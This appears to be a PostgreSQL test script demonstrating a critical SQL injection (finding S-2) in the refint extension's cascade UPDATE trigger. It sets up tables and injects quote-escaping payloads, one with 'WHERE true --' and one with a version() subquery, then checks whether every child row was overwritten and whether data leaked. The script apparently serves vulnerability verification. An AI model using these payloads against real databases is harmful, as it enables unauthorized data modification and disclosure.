-- S-2: SQL Injection via Unescaped Column Values in refint.c Cascade UPDATE
-- Severity: Critical
-- File: contrib/spi/refint.c, lines 501-504
--
-- check_foreign_key argument order:
--   check_foreign_key(nkeys, action, parent_key_col, child_table, child_fk_col)
--
-- IMPORTANT: Must be AFTER trigger. Plan caching means injection only works
-- on first trigger fire per backend session.
--
-- Prerequisites: CREATE EXTENSION refint;

\echo '=== S-2: refint cascade SQL injection test ==='

DROP TABLE IF EXISTS s2_child CASCADE;
DROP TABLE IF EXISTS s2_parent CASCADE;

CREATE TABLE s2_parent (
    id serial PRIMARY KEY,
    fk_val text NOT NULL UNIQUE
);

CREATE TABLE s2_child (
    id serial PRIMARY KEY,
    fk_val text,
    other_data text DEFAULT 'original'
);

-- Insert baseline data
INSERT INTO s2_parent (fk_val) VALUES ('safe_value');
INSERT INTO s2_child (fk_val, other_data) VALUES ('safe_value', 'row1');
INSERT INTO s2_child (fk_val, other_data) VALUES ('safe_value', 'row2');
INSERT INTO s2_child (fk_val, other_data) VALUES ('different', 'row3');

-- Correct argument order: nkeys, action, PARENT_KEY_COL, CHILD_TABLE, CHILD_FK_COL
CREATE TRIGGER s2_cascade_trigger
    AFTER UPDATE OR DELETE ON s2_parent
    FOR EACH ROW
    EXECUTE PROCEDURE check_foreign_key(1, 'c', 'fk_val', 's2_child', 'fk_val');

\echo 'Setup complete. Child table before injection:'
SELECT * FROM s2_child ORDER BY id;

\echo ''
\echo 'Test 1: WHERE-clause injection via value'
\echo 'Payload: update parent fk_val to a value that escapes the quote'
\echo ''

-- The cascade trigger builds (for char types):
--   UPDATE s2_child SET fk_val = '<new_value>' WHERE fk_val = $1
-- Our payload: x' WHERE true --
-- Produces:    UPDATE s2_child SET fk_val = 'x' WHERE true --' WHERE fk_val = $1
UPDATE s2_parent SET fk_val = $$x' WHERE true --$$ WHERE fk_val = 'safe_value';

\echo 'Child table after injection:'
SELECT * FROM s2_child ORDER BY id;

DO $$
DECLARE
    row3_val text;
BEGIN
    SELECT fk_val INTO row3_val FROM s2_child WHERE other_data = 'row3';
    IF row3_val IS NULL OR row3_val != 'different' THEN
        RAISE NOTICE 'S-2 RESULT (WHERE injection): *** VERIFIED *** - Row3 changed from "different" to "%"', row3_val;
        RAISE NOTICE 'WHERE true caused ALL rows to be updated, proving SQL injection.';
    ELSE
        RAISE NOTICE 'S-2 RESULT (WHERE injection): NOT VERIFIED - Row3 still "%"', row3_val;
    END IF;
END;
$$;

-- Test 2: Subquery injection (fresh trigger name = fresh plan)
\echo ''
\echo 'Test 2: Subquery injection to exfiltrate version()'

DROP TABLE IF EXISTS s2_child2 CASCADE;
DROP TABLE IF EXISTS s2_parent2 CASCADE;

CREATE TABLE s2_parent2 (
    id serial PRIMARY KEY,
    fk_val text NOT NULL UNIQUE
);
CREATE TABLE s2_child2 (
    id serial PRIMARY KEY,
    fk_val text
);

INSERT INTO s2_parent2 (fk_val) VALUES ('safe');
INSERT INTO s2_child2 (fk_val) VALUES ('safe');

CREATE TRIGGER s2_cascade2
    AFTER UPDATE OR DELETE ON s2_parent2
    FOR EACH ROW
    EXECUTE PROCEDURE check_foreign_key(1, 'c', 'fk_val', 's2_child2', 'fk_val');

-- Inject: ' || version() || '' WHERE true --
-- Becomes: UPDATE s2_child2 SET fk_val = '' || version() || '' WHERE true --' WHERE ...
UPDATE s2_parent2 SET fk_val = $$' || version() || '' WHERE true --$$ WHERE fk_val = 'safe';

\echo 'Child table after subquery injection:'
SELECT * FROM s2_child2;

DO $$
DECLARE
    child_val text;
BEGIN
    SELECT fk_val INTO child_val FROM s2_child2 LIMIT 1;
    IF child_val LIKE '%PostgreSQL%' THEN
        RAISE NOTICE 'S-2 RESULT (subquery): *** VERIFIED *** - version() exfiltrated: %', child_val;
    ELSIF child_val != 'safe' THEN
        RAISE NOTICE 'S-2 RESULT (subquery): Value changed to: %', child_val;
    ELSE
        RAISE NOTICE 'S-2 RESULT (subquery): NOT VERIFIED - value unchanged: %', child_val;
    END IF;
END;
$$;

-- Cleanup
DROP TABLE IF EXISTS s2_child CASCADE;
DROP TABLE IF EXISTS s2_parent CASCADE;
DROP TABLE IF EXISTS s2_child2 CASCADE;
DROP TABLE IF EXISTS s2_parent2 CASCADE;

\echo '=== S-2 test complete ==='
